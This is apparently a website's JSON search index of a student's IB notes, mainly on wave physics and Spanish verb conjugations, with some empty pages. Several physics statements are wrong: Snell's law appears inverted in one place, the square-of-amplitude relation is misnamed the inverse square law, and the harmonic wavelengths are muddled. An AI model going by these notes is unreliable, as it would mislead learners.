\\(m\\) .","title":"The Universal Wave Equation"},{"location":"IB/HL%20Physics/waves/#wave-characteristics","text":"","title":"Wave Characteristics"},{"location":"IB/HL%20Physics/waves/#wavefronts-and-rays","text":"Wavefronts : are lines joining points which vibrate in phase with each other. Wavefronts can be straight lines or curves and the distance between successive wavefronts is the wavelength of the wave. Rays : are lines that indicate the direction of a wave propagation. They are always perpendicular to wavefronts.","title":"Wavefronts and Rays"},{"location":"IB/HL%20Physics/waves/#amplitude-and-intensity","text":"The intensity is defined as the power per unit area \\(\\frac{P}{A}\\) and is measured in \\(wm^{-2}\\) . The amplitude and intensity of the wave is corelate to the energy the wave has. The intensity of the wave is proportional to the square of it's amplitude thus \\(I\\alpha A^2\\) . This is the inverse square law.","title":"Amplitude and Intensity"},{"location":"IB/HL%20Physics/waves/#polarization","text":"Only transverse waves can be polarized. Polarization restricts the oscillations of a transverse wave to one plane. In the diagrams, the light is initially oscillating in all directions perpendicular to the wave direction. A piece of Polaroid only allows light transmission in one plane, filtering out oscillations in other oscillations. This is proof that the waves of the EM spectrum are transverse waves. If they were longitudinal waves the forwards and backwards motion would not be stopped by crossed pieces of Polaroid; the bottom set up would emit light.","title":"Polarization"},{"location":"IB/HL%20Physics/waves/#malus-law","text":"Malu's law states that the intensity of plane-polarized light that passes through an analyzer varies as the square of the cosine of the angle between the plane of the polarizer and the transmission axes of the analyzer defined by \\[ I = I_0 \\cos^2{\\theta} \\]","title":"Malu's Law"},{"location":"IB/HL%20Physics/waves/#usages-of-polarization","text":"Polarization can be used to analyze optically active substances which rotates the plane of polarization such as sugar. The sweetness of the sugar is reflected by the intensity that passes through. Another use case is LCD or Liquid Crystal Displays. The liquid crystal will change is polarization when electricity is applied and thus being able to be seen through another polarizing film.","title":"Usages of Polarization"},{"location":"IB/HL%20Physics/waves/#superposition","text":"Superposition is the process by which two waves combine into a single wave form when they overlap. If we add these waves together the resultant depends on where the peaks of the waves are compared to each other. The principal of superposition states that when two waves meet the resultant displacement is the sum of the individual displacements. Here are three examples of what the resultant could be: a wave with an amplitude of 1.5 , no resultant wave at all and a wave with an amplitude of 2.0 Path Difference : If two waves from the same source arrive at a point having taken a different path (Eg one of them reflected), they may have traveled different distances from the source. This difference in journey is called the path difference. The path difference directly impacts how the wave superpositions itself with the other wave. If the path difference is equal to a whole number of wavelengths ( \\(PD=\u03bb, 2\u03bb, 3\u03bb, 4\u03bb\u2026\\) ), the two waves will be in phase at this point and constructive interference will be observed (addition of amplitudes). If the path difference is a multiple of half a wavelength ( \\(PD=0.5\u03bb, 1.5\u03bb, 2.5\u03bb,3.5\u03bb\u2026\\) ), the two waves will be in anti-phase at that point (\"out of phase\") and destructive interference will be observed (reduction of amplitude/cancellation).","title":"Superposition"},{"location":"IB/HL%20Physics/waves/#wave-behaviors","text":"","title":"Wave Behaviors"},{"location":"IB/HL%20Physics/waves/#refraction","text":"Refraction is the change in direction of a wave when it transmits from one medium to another. An example would be a light ray refracting when entering water.","title":"Refraction"},{"location":"IB/HL%20Physics/waves/#refractive-index","text":"The refractive index of a material is a measure of how easy it is for light to travel through it. The refractive index of material s can be calculated using: \\[ n = \\frac{c}{c_s} \\] Where \\(n\\) is the refractive index, \\(c\\) is the speed of light in a vacuum and \\(c_s\\) is the speed of light in the material. Note that the higher the refractive index, the slower light can travel through it. The higher the refractive index, the denser is the material. If the ray of light is incident at 90\u00b0 to the material then there is no change in direction, only speed. When light passes from one material to another it is not only the speed of the light that changes, the direction often changes too. The angle of incidence, \\(\\theta_1\\) , and the angle of refraction, \\(\\theta_2\\) , is given by Snell's Law : \\[ \\frac{n_1}{n_2} = \\frac{\\sin{\\theta_1}}{\\sin{\\theta_2}} \\] In this case, \\(n_1\\) always the faster medium and \\(n_2\\) having a larger index of refraction. When a wave travels from fast-to-slow: the wave bends towards normal; slow-to-fast: away from normal. A good way of thinking it is using wavefronts. In addition, the refractive indices are also related as following using the Universal Wave Equation : \\[ \\frac{\\sin \\theta_{1}}{\\sin \\theta_{2}}=\\frac{n_{2}}{n_{1}}=\\frac{\\lambda_{1}}{\\lambda_{2}}=\\frac{v_{1}}{v_{2}} \\] As shown when a wave travels through an intersection the frequency never changes but the wavelength and speed changes.","title":"Refractive Index"},{"location":"IB/HL%20Physics/waves/#reflection","text":"Reflection happens when an incoming incident wave hits a reflecting surface. As shown in the image above, the angle of incidence is always equal to the angle of reflection. The normal is the arbitrary perpendicular line to the reflecting surface. The reflection of waves if one end is tied is inverted as shown: reflection of waves from a free end is not inverted:","title":"Reflection"},{"location":"IB/HL%20Physics/waves/#critical-angle","text":"When light travels from one medium to another the majority of light refracts but some of the light also reflects off of the junction and stays in the original material. When an incident ray strikes the boundary of two mediums at an angle less than the critical angle, the light refracts into the second medium. If the ray strikes equal to the critical angle, the light is right along the junction. When the incident ray is greater than the critical angle, all the light is reflected into the original medium. The critical angle can be found using the relationship between the refractive index of the two materials. Derived from Snell's Law by substituting \\(\\theta_2=90\\degree\\) \\[ \\sin{\\theta_{c}}=\\frac{1}{n_1} \\]","title":"Critical Angle"},{"location":"IB/HL%20Physics/waves/#total-internal-reflection","text":"Total internal reflection only occurs when the light ray propagates from a optically denser medium to an optically less dense medium (always from the slower medium). An important usage is optical fibres, which is thin piece of flexible glass.","title":"Total Internal Reflection"},{"location":"IB/HL%20Physics/waves/#diffraction","text":"Diffraction is when a wave bends as it passes through an obstacle or through an opening. The amount of diffraction depends on the wavelength compared to the gap as shown. When the wavelength is roughly equal to the slit width, maximum diffraction occurs. Waves can also ben about any obstacle, for example a wall or corner. Huygen's Principal : Every wavefront is made of series of circular wavesources. The new position of the wavefront is formed by connecting the circular wavefronts from the previous wavefront.","title":"Diffraction"},{"location":"IB/HL%20Physics/waves/#superposition-interference","text":"Superposition is explained previously here . Interference is a special case of superposition where the waves that combine are coherent. The waves overlap and form a repeating interference pattern of maxima and minima areas. If the waves weren\u2019t coherent the interference pattern would change rapidly and continuously. Constructive interference occurs when two pulses displaced in the same direction cause an overlap. The resultant displacement is the sum of both displacements. Destructive interference occurs when two pulses displaced in opposite directions cause an overlap. The resultant displacement is the difference of both displacements.","title":"Superposition &amp; Interference"},{"location":"IB/HL%20Physics/waves/#standing-waves","text":"When two similar waves travel in opposite directions, they can superpose to form a standing (or stationary) wave. Here is the experimental set up of how we can form a standing wave on a string. The vibration generator sends waves down the string at a certain frequency, they reach the end of the string and reflect back at the same frequency. On their way back the two waves traveling in opposite direction superpose to form a standing wave made up of nodes and antinode. Nodes : Positions on a standing wave which do not vibrate. The waves combine to give zero displacement Anti-nodes : Positions on a standing wave where there is a maximum displacement.","title":"Standing Waves"},{"location":"IB/HL%20Physics/waves/#traveling-vs-standing-waves","text":"Standing Waves Traveling Waves Amplitude Maximum at antinode and zero at nodes The same for all parts of the wave Frequency All parts of the wave have the same frequency All parts of the wave have the same frequency Wavelength Twice the distance between adjacent nodes The distance between two adjacent peaks Phase All points between two adjacent nodes in phase Points one wavelength apart in phase Energy No energy translation Energy translation in the direction of the wave Waveform Does not move forward Moves forwards","title":"Traveling vs Standing Waves"},{"location":"IB/HL%20Physics/waves/#harmonics","text":"As we increase the frequency of the vibration generator, we can see standing waves being set up. The first will occur when the generator is vibrating at the fundamental frequency, f0, of the string. First Harmonic \\(f = f_0 \\lambda = 2 L\\) 2 nodes and 1 antinode Second Harmonic \\(f = 2f_0 \\lambda = L\\) 3 nodes and 2 antinodes Third Harmonic \\(f = 3f_0 \\lambda = \\frac{2}{3} L\\) 4 nodes and 3 antinodes Fourth Harmonic \\(f = 4f_0 \\lambda = \\frac{1}{2} L\\) 5 nodes and 4 antinodes A string with a free end will produce an anti-node at the end point, compared to a node if the end is fixed. Similarly, standing waves in open ended pipes produce anti-nodes at the ends, whereas closed pipes produce nodes at the end points.","title":"Harmonics"},{"location":"IB/HL%20Physics/waves/#aircolumns","text":"","title":"Aircolumns"},{"location":"IB/HL%20Physics/waves/#eliminating-end-effect","text":"The end effect refers to the small section (denoted as \\(\\Delta x\\) ) where the wave doesn't quite know if it's free to travel in air yet and thus result in inaccurate measurements. To combat this, we can move the air column in water down until we hear the first time the sound is loud, this is when the aircolumn is at it's first harmonic with wavelength \\(\\frac{\\lambda}{4}\\) . We can move it further down when the sound becomes loud once again at the 3rd harmonic which has a wavelength of \\(\\frac{3\\lambda}{4}\\) . With simple math, we can accurately calculate the wavelength. And since the end effect is present on both harmonics, when subtracting, it's eliminated.","title":"Eliminating \"End Effect\""},{"location":"IB/SL%20Chemistry/bonding/","text":"Chemical Bonding and Structure \u00b6","title":"Chemical Bonding and Structure"},{"location":"IB/SL%20Chemistry/bonding/#chemical-bonding-and-structure","text":"","title":"Chemical Bonding and Structure"},{"location":"IB/SL%20Spanish%20B/gramar/","text":"Gram\u00e1tica \u00b6 Here's a document that organizes the verb tenses learnt in IB Spanish B. Presente \u00b6 The present simple tense is the most commonly used tense in Spanish. It is formed when you want to talk about a habit or somtehing that happens in general. Regular verbs are conjugated as such: AR ER IR Example verb hablar comer abrir yo (habl)o (com)o (abr)o t\u00fa (habl)as (com)es (abr)es \u00e9l/ella (habl)a (com)e (abr)e nosotros (habl)amos (com)emos (abr)imos vosotros (habl)\u00e1is (com)\u00e9is (abr)\u00eds ellos/ellas (habl)an (com)en (abr)en Presente Progresivo \u00b6 The gerund usually ends with either -ando for -AR verbs or -iendo for -IR and -ER verbs in Spanish. The gerund ends in \u201c-ing\u201d in English. Infinitive Gerundio llegar llegando partir partiendo comer comiendo Pretente Perfecto \u00b6 To conjugate in present perfect haber is conjugated to let us know who completed the action. Present yo he t\u00fa has \u00e9l/ella/Ud. ha, hay nosotros hemos vosotros hab\u00e9is ellos/ellas/Uds. han Then we add the past participle of the verb which is conjugated as such: AR IR/ER -ado -ido Pasado \u00b6 Pret\u00e9rito \u00b6 AR ER IR Example verb hablar comer abrir yo (habl)\u00e9 (com)\u00ed (abr)\u00ed t\u00fa (habl)aste (com)iste (abr)iste \u00e9l/ella (habl)\u00f3 (com)i\u00f3 (abr)i\u00f3 nosotros (habl)amos (com)imos (abr)imos vosotros (habl)asteis (com)isteis (abr)isteis ellos/ellas (habl)aron (com)ieron (abr)ieron Imperfecto \u00b6 AR ER/IR Example verb hablar comer yo (habl)aba (com)\u00eda t\u00fa (habl)abas (com)\u00edas \u00e9l/ella (habl)aba (com)\u00eda nosotros (habl)\u00e1bamos (com)\u00edamos vosotros (habl)abais (com)\u00edais ellos/ellas (habl)aban (com)\u00edan Futuro \u00b6 Ir + a \u00b6 Simple \u00b6 AR/ER/IR Example verb hablar yo (hablar)\u00e9 t\u00fa (hablar)\u00e1s \u00e9l/ella (hablar)\u00e1 nosotros (hablar)emos vosotros (hablar)\u00e1is ellos/ellas (hablar)\u00e1n Condicional \u00b6 AR/ER/IR Example verb hablar yo (hablar)\u00eda t\u00fa (hablar)\u00edas \u00e9l/ella (hablar)\u00eda nosotros (hablar)\u00edamos vosotros (hablar)\u00edais ellos/ellas (hablar)\u00edan Comandos \u00b6 Subjuntivo \u00b6","title":"Gram\u00e1tica"},{"location":"IB/SL%20Spanish%20B/gramar/#gramatica","text":"Here's a document that organizes the verb tenses learnt in IB Spanish B.","title":"Gram\u00e1tica"},{"location":"IB/SL%20Spanish%20B/gramar/#presente","text":"The present simple tense is the most commonly used tense in Spanish. It is formed when you want to talk about a habit or somtehing that happens in general. Regular verbs are conjugated as such: AR ER IR Example verb hablar comer abrir yo (habl)o (com)o (abr)o t\u00fa (habl)as (com)es (abr)es \u00e9l/ella (habl)a (com)e (abr)e nosotros (habl)amos (com)emos (abr)imos vosotros (habl)\u00e1is (com)\u00e9is (abr)\u00eds ellos/ellas (habl)an (com)en (abr)en","title":"Presente"},{"location":"IB/SL%20Spanish%20B/gramar/#presente-progresivo","text":"The gerund usually ends with either -ando for -AR verbs or -iendo for -IR and -ER verbs in Spanish. The gerund ends in \u201c-ing\u201d in English. Infinitive Gerundio llegar llegando partir partiendo comer comiendo","title":"Presente Progresivo"},{"location":"IB/SL%20Spanish%20B/gramar/#pretente-perfecto","text":"To conjugate in present perfect haber is conjugated to let us know who completed the action. Present yo he t\u00fa has \u00e9l/ella/Ud. ha, hay nosotros hemos vosotros hab\u00e9is ellos/ellas/Uds. han Then we add the past participle of the verb which is conjugated as such: AR IR/ER -ado -ido","title":"Pretente Perfecto"},{"location":"IB/SL%20Spanish%20B/gramar/#pasado","text":"","title":"Pasado"},{"location":"IB/SL%20Spanish%20B/gramar/#preterito","text":"AR ER IR Example verb hablar comer abrir yo (habl)\u00e9 (com)\u00ed (abr)\u00ed t\u00fa (habl)aste (com)iste (abr)iste \u00e9l/ella (habl)\u00f3 (com)i\u00f3 (abr)i\u00f3 nosotros (habl)amos (com)imos (abr)imos vosotros (habl)asteis (com)isteis (abr)isteis ellos/ellas (habl)aron (com)ieron (abr)ieron","title":"Pret\u00e9rito"},{"location":"IB/SL%20Spanish%20B/gramar/#imperfecto","text":"AR ER/IR Example verb hablar comer yo (habl)aba (com)\u00eda t\u00fa (habl)abas (com)\u00edas \u00e9l/ella (habl)aba (com)\u00eda nosotros (habl)\u00e1bamos (com)\u00edamos vosotros (habl)abais (com)\u00edais ellos/ellas (habl)aban (com)\u00edan","title":"Imperfecto"},{"location":"IB/SL%20Spanish%20B/gramar/#futuro","text":"","title":"Futuro"},{"location":"IB/SL%20Spanish%20B/gramar/#ir-a","text":"","title":"Ir + a"},{"location":"IB/SL%20Spanish%20B/gramar/#simple","text":"AR/ER/IR Example verb hablar yo (hablar)\u00e9 t\u00fa (hablar)\u00e1s \u00e9l/ella (hablar)\u00e1 nosotros (hablar)emos vosotros (hablar)\u00e1is ellos/ellas (hablar)\u00e1n","title":"Simple"},{"location":"IB/SL%20Spanish%20B/gramar/#condicional","text":"AR/ER/IR Example verb hablar yo (hablar)\u00eda t\u00fa (hablar)\u00edas \u00e9l/ella (hablar)\u00eda nosotros (hablar)\u00edamos vosotros (hablar)\u00edais ellos/ellas (hablar)\u00edan","title":"Condicional"},{"location":"IB/SL%20Spanish%20B/gramar/#comandos","text":"","title":"Comandos"},{"location":"IB/SL%20Spanish%20B/gramar/#subjuntivo","text":"","title":"Subjuntivo"},{"location":"Journals/plover/","text":"Plover Journal \u00b6","title":"Plover Journal"},{"location":"Journals/plover/#plover-journal","text":"","title":"Plover Journal"},{"location":"Miscellaneous/functions/","text":"Advanced Functions - PLAR Exam \u00b6","title":"Advanced Functions - PLAR Exam"},{"location":"Miscellaneous/functions/#advanced-functions-plar-exam","text":"","title":"Advanced Functions - PLAR Exam"}]}